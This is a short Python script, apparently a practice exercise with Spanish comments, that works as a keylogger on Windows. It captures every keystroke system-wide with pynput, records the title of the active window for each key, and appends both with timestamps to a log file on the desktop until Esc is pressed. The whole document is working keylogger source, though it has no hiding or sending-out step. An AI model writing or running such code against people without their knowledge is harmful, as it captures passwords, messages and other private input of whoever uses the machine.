from pynput import keyboard
from datetime import datetime
import win32gui

def on_press(key):
    try:
        # Obtener la ventana activa correctamente
        ventana = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        
        # Procesar la tecla
        if hasattr(key, 'char') and key.char is not None:
            tecla = key.char
        else:
            tecla = str(key).replace('Key.', '')
        
        # Guardar en archivo
        with open(r"C:\Users\Equipo\Desktop\ejercicio\log_teclas.txt", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] Ventana: {ventana} | Tecla: {tecla}\n")
        
        print(f"Ventana: {ventana} | Tecla: {tecla}")
        
    except Exception as e:
        print("Error:", e)

    if key == keyboard.Key.esc:
        return False

# Iniciar el listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
